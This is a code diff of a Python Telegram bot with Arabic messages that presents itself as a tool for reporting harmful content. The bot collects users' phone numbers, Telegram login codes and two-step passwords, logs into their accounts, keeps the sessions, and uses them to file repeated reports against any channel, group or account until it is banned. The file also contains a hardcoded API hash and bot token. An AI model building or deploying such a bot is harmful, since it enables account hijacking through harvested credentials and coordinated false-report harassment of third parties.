@@ -2,11 +2,11 @@ import asyncio
 import re
 import os
 from telethon import TelegramClient, events, Button
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneNumberInvalidError
 from telethon.tl.types import InputReportReasonSpam, InputReportReasonViolence, InputReportReasonPornography, InputReportReasonOther
 from telethon.tl.functions.messages import ReportRequest
 
-# إعدادات البوت
+# إعدادات البوت (يجب تعبئتها)
 API_ID = 23656977  # استبدل بـ API ID الخاص بك
 API_HASH = '49d3f43531a92b3f5bc403766313ca1e'  # استبدل بـ API HASH الخاص بك
 BOT_TOKEN = '8312137482:AAEORpBnD8CmFfB39ayJT4UputPoSh_qCRw'
@@ -38,11 +38,34 @@ async def start(event):
     user_id = event.sender_id
     user_states[user_id] = PHONE
     
-    # إرسال رسالة البدء مع زر لبدء الجلسة
+    # إرسال رسالة البدء مع تعليمات واضحة
     await event.respond(
-        "مرحباً! 🌍\n"
+        "مرحباً بك في بوت البيئة النظيفة! 🌍\n"
         "هذا البوت يساعدك في الإبلاغ عن المحتوى الضار لخلق بيئة تلجرام أنظف.\n\n"
-        "الرجاء إرسال رقم هاتفك مع رمز الدولة (مثل: +201234567890):"
+        "**الرجاء إرسال رقم هاتفك مع رمز الدولة:**\n"
+        "- يجب أن يبدأ الرقم بعلامة '+' ثم رمز الدولة ثم رقم الهاتف\n"
+        "- مثال صحيح: `+966501234567`\n"
+        "- مثال خاطئ: `00966501234567` أو `966501234567`\n\n"
+        "ملاحظة: سوف تتلقى كود تحقق على حساب التلجرام المرتبط بهذا الرقم."
+    )
+
+# مساعدة
+@bot.on(events.NewMessage(pattern='/help'))
+async def help_command(event):
+    await event.respond(
+        "🆘 **دليل استخدام البوت:**\n\n"
+        "1. ابدأ الأمر بـ /start\n"
+        "2. أرسل رقم هاتفك الدولي (مع رمز الدولة وعلامة '+' في البداية)\n"
+        "3. ستصلك رسالة على التلجرام تحتوي على كود تحقق\n"
+        "4. أرسل الكود الذي استلمته إلى البوت\n"
+        "5. اختر نوع البلاغ من الأزرار\n"
+        "6. أرسل رابط المجموعة أو القناة أو الحساب\n"
+        "7. اكتب رسالة توضح المشكلة\n"
+        "8. تأكد من المعلومات وأرسل البلاغ\n\n"
+        "سيقوم البوت بعد ذلك بإرسال عدة بلاغات إلى إدارة تلجرام\n\n"
+        "للإيقاف: /stop\n"
+        "للمساعدة: /help\n\n"
+        "للإبلاغ عن مشكلة: راسل المطور @USERNAME"
     )
 
 # معالجة رسائل المستخدم
@@ -66,10 +89,32 @@ async def handle_message(event):
 # معالجة رقم الهاتف
 async def handle_phone(event):
     user_id = event.sender_id
-    phone = event.raw_text
+    phone = event.raw_text.strip()
     
+    # تنظيف الرقم
+    phone = phone.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
+    
+    # محاولة تصحيح الأرقام التي تبدأ بـ "00"
+    if phone.startswith("00"):
+        phone = "+" + phone[2:]
+    # تصحيح الأرقام التي تبدأ بـ "0" بدون رمز دولة
+    elif phone.startswith("0") and not phone.startswith("+"):
+        phone = "+" + phone
+    # إضافة + إذا نساها المستخدم
+    elif not phone.startswith("+"):
+        phone = "+" + phone
+    
+    # التحقق من صحة الرقم
     if not re.match(r"^\+\d{10,15}$", phone):
-        await event.respond("❌ رقم غير صحيح! الرجاء إدخال رقم صحيح مع رمز الدولة مثل: +201234567890")
+        await event.respond(
+            "❌ **رقم غير صحيح!**\n"
+            "الرجاء إدخال رقم هاتف صحيح مع رمز الدولة يبدأ بعلامة '+'.\n"
+            "أمثلة:\n"
+            "- `+966501234567`\n"
+            "- `+201012345678`\n"
+            "- `+971501234567`\n\n"
+            "الرجاء إعادة المحاولة:"
+        )
         return
     
     # إنشاء جلسة جديدة للمستخدم
@@ -85,12 +130,19 @@ async def handle_phone(event):
             'phone_code_hash': sent_code.phone_code_hash
         }
         user_states[user_id] = CODE
+        
+        # إرسال رسالة توضيحية للكود
         await event.respond(
-            f"🔑 تم إرسال كود التحقق إلى رقم {phone}\n"
-            "الرجاء إدخال الكود المكون من 5 أرقام:"
+            f"🔑 **تم إرسال كود التحقق إلى الرقم {phone}**\n\n"
+            "طريقة الاستلام:\n"
+            "1. إشعار في تطبيق Telegram\n"
+            "2. رسالة SMS (إذا لم يصل الإشعار)\n\n"
+            "الرجاء إدخال الكود المكون من 5 أرقام (مثل: 12345):"
         )
+    except PhoneNumberInvalidError:
+        await event.respond("❌ رقم الهاتف غير صالح. الرجاء التحقق وإعادة الإدخال:")
     except Exception as e:
-        await event.respond(f"❌ حدث خطأ: {str(e)}")
+        await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء المحاولة مرة أخرى /start")
         del user_states[user_id]
 
 # معالجة كود التحقق
@@ -98,8 +150,8 @@ async def handle_code(event):
     user_id = event.sender_id
     code = event.raw_text.strip()
     
-    if not re.match(r"^\d{5}$", code):
-        await event.respond("❌ كود غير صحيح! يجب أن يكون 5 أرقام.")
+    if not re.match(r"^\d{5,6}$", code):  # قد يكون الكود 5 أو 6 أرقام
+        await event.respond("❌ كود غير صحيح! يجب أن يكون بين 5-6 أرقام. الرجاء إعادة الإدخال:")
         return
     
     session = sessions.get(user_id)
@@ -126,17 +178,17 @@ async def handle_code(event):
         ]
         
         await event.respond(
-            f"✅ تم التحقق بنجاح! مرحباً {me.first_name}\n\n"
-            "الرجاء اختيار نوع البلاغ:",
+            f"✅ **تم التحقق بنجاح!** مرحباً {me.first_name}\n\n"
+            "الرجاء اختيار نوع البلاغ من الأزرار أدناه:",
             buttons=buttons
         )
     except PhoneCodeInvalidError:
-        await event.respond("❌ كود التحقق غير صحيح! الرجاء المحاولة مرة أخرى.")
+        await event.respond("❌ كود التحقق غير صحيح! الرجاء المحاولة مرة أخرى:")
     except SessionPasswordNeededError:
         await event.respond("🔒 حسابك محمي بكلمة سر. الرجاء إرسال كلمة السر:")
         user_states[user_id] = 'PASSWORD'
     except Exception as e:
-        await event.respond(f"❌ حدث خطأ: {str(e)}")
+        await event.respond(f"❌ حدث خطأ: {str(e)}\nالرجاء البدء من جديد /start")
         del user_states[user_id]
 
 # معالجة كلمة السر
@@ -163,12 +215,12 @@ async def handle_password(event):
         ]
         
         await event.respond(
-            f"✅ تم التحقق بنجاح! مرحباً {me.first_name}\n\n"
-            "الرجاء اختيار نوع البلاغ:",
+            f"✅ **تم التحقق بنجاح!** مرحباً {me.first_name}\n\n"
+            "الرجاء اختيار نوع البلاغ من الأزرار أدناه:",
             buttons=buttons
         )
     except Exception as e:
-        await event.respond(f"❌ خطأ في كلمة السر: {str(e)}")
+        await event.respond(f"❌ خطأ في كلمة السر: {str(e)}\nالرجاء المحاولة مرة أخرى:")
 
 # معالجة نوع البلاغ
 @bot.on(events.CallbackQuery)
@@ -182,25 +234,46 @@ async def handle_report_type(event):
     
     user_states[user_id] = REPORT_LINK
     await event.edit(
-        f"📌 نوع البلاغ: {REPORT_TYPES[report_type][0]}\n\n"
-        "الرجاء إرسال رابط المجموعة/القناة/الحساب:"
+        f"📌 **نوع البلاغ:** {REPORT_TYPES[report_type][0]}\n\n"
+        "الرجاء إرسال رابط المجموعة/القناة/الحساب المراد الإبلاغ عنه:\n"
+        "- مثال: https://t.me/group_name\n"
+        "- أو: @username"
     )
     sessions[user_id]['report_type'] = report_type
 
 # معالجة رابط البلاغ
 async def handle_report_link(event):
     user_id = event.sender_id
-    link = event.raw_text
+    link = event.raw_text.strip()
     
-    if not re.match(r"^(https?://t\.me/|@)[a-zA-Z0-9_]{5,32}$", link):
-        await event.respond("❌ رابط غير صحيح! الرجاء إرسال رابط صحيح مثل:\nhttps://t.me/group_name\nأو @username")
+    # تنظيف الرابط
+    if link.startswith("https://"):
+        link = link
+    elif link.startswith("@"):
+        link = link[1:]
+    else:
+        link = link
+    
+    # التحقق من صحة الرابط
+    if not re.match(r"^(https?://t\.me/[\w]{5,32}|[\w]{5,32})$", link):
+        await event.respond(
+            "❌ **رابط غير صحيح!**\n"
+            "الرجاء إرسال رابط صحيح مثل:\n"
+            "- https://t.me/group_name\n"
+            "- @username\n\n"
+            "الرجاء إعادة المحاولة:"
+        )
         return
+    
+    # إذا كان الرابط بدون https نضيفه
+    if not link.startswith("http"):
+        link = "https://t.me/" + link
     
     sessions[user_id]['report_link'] = link
     user_states[user_id] = REPORT_MESSAGE
     await event.respond(
-        "✍️ الرجاء كتابة تفاصيل البلاغ:\n"
-        "(وصف المشكلة، المستخدمين المتورطين، إلخ)"
+        "✍️ **تفاصيل البلاغ:**\n"
+        "الرجاء كتابة وصف للمشكلة (مثال: المجموعة تنشر محتوى غير لائق...):"
     )
 
 # معالجة تفاصيل البلاغ
@@ -212,10 +285,10 @@ async def handle_report_message(event):
     
     report_type = sessions[user_id]['report_type']
     report_details = (
-        f"📝 تفاصيل البلاغ:\n"
-        f"النوع: {REPORT_TYPES[report_type][0]}\n"
-        f"الرابط: {sessions[user_id]['report_link']}\n"
-        f"التفاصيل: {report_message}"
+        f"📝 **تفاصيل البلاغ:**\n"
+        f"- النوع: {REPORT_TYPES[report_type][0]}\n"
+        f"- الرابط: {sessions[user_id]['report_link']}\n"
+        f"- التفاصيل: {report_message}"
     )
     
     buttons = [
@@ -225,7 +298,7 @@ async def handle_report_message(event):
     
     await event.respond(
         report_details + "\n\n"
-        "الرجاء التأكيد قبل الإرسال:",
+        "**الرجاء التأكيد قبل الإرسال:**",
         buttons=buttons
     )
 
@@ -251,8 +324,9 @@ async def handle_confirmation(event):
         }
         
         await event.edit(
-            "⏳ جاري بدء عملية الإبلاغ...\n"
-            "سأقوم بإرسال البلاغات بشكل متكرر حتى يتم حظر المحتوى.\n\n"
+            "⏳ **جاري بدء عملية الإبلاغ...**\n\n"
+            "سأقوم بإرسال البلاغات بشكل متكرر حتى يتم حظر المحتوى الضار.\n"
+            "قد تستغرق العملية بضع دقائق.\n\n"
             "يمكنك إيقاف العملية بأي وقت باستخدام /stop"
         )
         
@@ -289,7 +363,7 @@ async def send_reports(user_id):
         # إعلام المستخدم
         await bot.send_message(
             user_id,
-            f"🚀 تم إرسال البلاغ #{report['count']} إلى إدارة تلجرام"
+            f"🚀 **تم إرسال البلاغ #{report['count']} إلى إدارة تلجرام**"
         )
         
         # زيادة العداد
@@ -302,7 +376,9 @@ async def send_reports(user_id):
         else:
             await bot.send_message(
                 user_id,
-                "✅ تم إكمال عملية الإبلاغ! تم إرسال 10 بلاغات إلى إدارة تلجرام."
+                "✅ **تم إكمال عملية الإبلاغ!**\n"
+                "تم إرسال 10 بلاغات إلى إدارة تلجرام.\n"
+                "شكراً لمساهمتك في جعل تلجرام أنظف."
             )
             # تنظيف الموارد
             await client.disconnect()
@@ -313,9 +389,18 @@ async def send_reports(user_id):
     except Exception as e:
         await bot.send_message(
             user_id,
-            f"❌ فشل في الإبلاغ: {str(e)}"
+            f"❌ **فشل في الإبلاغ:** {str(e)}\n"
+            "تم إيقاف عملية الإبلاغ."
         )
+        # تنظيف الموارد في حالة الخطأ
         if user_id in reports: del reports[user_id]
+        if user_id in sessions:
+            try:
+                await sessions[user_id]['client'].disconnect()
+            except:
+                pass
+            del sessions[user_id]
+        if user_id in user_states: del user_states[user_id]
 
 # معالجة أمر الإيقاف
 @bot.on(events.NewMessage(pattern='/stop'))
@@ -329,11 +414,15 @@ async def stop_reporting(event):
         if user_id in sessions: del sessions[user_id]
         if user_id in user_states: del user_states[user_id]
         
-        await event.respond("⏹️ تم إيقاف عملية الإبلاغ بنجاح!")
+        await event.respond("⏹️ **تم إيقاف عملية الإبلاغ بنجاح!**")
     else:
-        await event.respond("⚠️ لا توجد عملية إبلاغ جارية.")
+        await event.respond("⚠️ **لا توجد عملية إبلاغ جارية.**")
 
 # تشغيل البوت
 if __name__ == '__main__':
+    # إنشاء مجلد الجلسات إذا لم يكن موجوداً
+    if not os.path.exists('sessions'):
+        os.makedirs('sessions')
+    
     print("جارٍ تشغيل البوت...")
     bot.run_until_disconnected()
